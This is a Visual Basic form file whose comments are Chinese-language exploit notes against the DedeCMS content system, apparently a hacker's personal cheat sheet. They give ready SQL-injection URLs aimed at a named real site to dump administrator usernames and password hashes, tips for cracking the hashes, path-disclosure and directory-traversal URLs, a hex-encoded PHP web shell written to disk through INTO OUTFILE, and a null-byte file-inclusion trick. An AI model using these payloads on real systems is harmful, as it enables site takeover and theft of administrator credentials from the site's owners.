VERSION 5.00
Begin VB.Form Form2 
   Caption         =   "Form2"
   ClientHeight    =   6630
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   11910
   LinkTopic       =   "Form2"
   ScaleHeight     =   6630
   ScaleWidth      =   11910
   StartUpPosition =   3  '窗口缺省
End
Attribute VB_Name = "Form2"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'我一般是这样测试的:
'提交kuxoo.com/plus/search.php?keyword=as&typeArr[ uNion ]=a
'
'看结果如果提示:
'Safe Alert: Request Error step 2 !
'那么直接用下面的Exp:
'kuxoo.com/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
'看结果如果提示:
'Safe Alert: Request Error step 1 !
'那么直接用下面的Exp:
'kuxoo.com/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'`+]=a
'Examples:
'http://kuxoo.com//plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,11,userid,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
'http://kuxoo.com//plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a
'
'如果正常显示证明漏洞不存在了。 20位的密文,去掉前3位和最后一位就行了！

'
'1.include/dialog/select_soft.php文件可以爆出dedecms的后台,以前的老版本可以跳过登陆验证直接访问,无需管理员帐号,新版本的就直接转向了后台.
'2.include/dialog/config.php会爆出后台管理路径
'3.include/dialog/select_soft.php?activepath=/include/FCKeditor 跳转目录
'4.include/dialog/select_soft.php?activepath=/st0pst0pst0pst0pst0pst0pst0pst0p 爆出网站绝对路径.
'5.另外一些低版本的DEDECMS访问这个页面的时候会直接跳过登陆验证,直接显示,而且还可以用/././././././././掉
'到根目录去.不过这些版本的访问地址有些不同.
'地址为require/dialog/select_soft.php?activepath=/././././././././
'include\dialog\目录下的另外几个文件都存在同一个问题,只是默认设的目录不同.有些可以查看HTML这些文件哦..
'存在相同问题的文件还有
'include\dialog\select_images.php
'include\dialog\select_media.php
'include\dialog\select_templets.php




'plus/carbuyaction.php?dopost=return&dsql=and 1=2 union select 1,0x3C3F70687020406576616C28245F504F53545B2763275D293B3F3E,3,..n into outfile '1.php'
'plus/carbuyaction.php?dopost=return&dsql=xx


'plus/carbuyaction.php?dopost=return&code=../../uploads/userup/xx/myface.gif%00



'http://www.xxx.com/plus/carbuyaction.php?dopost=return&code=../../
'在cookie 中加上 code=alipay




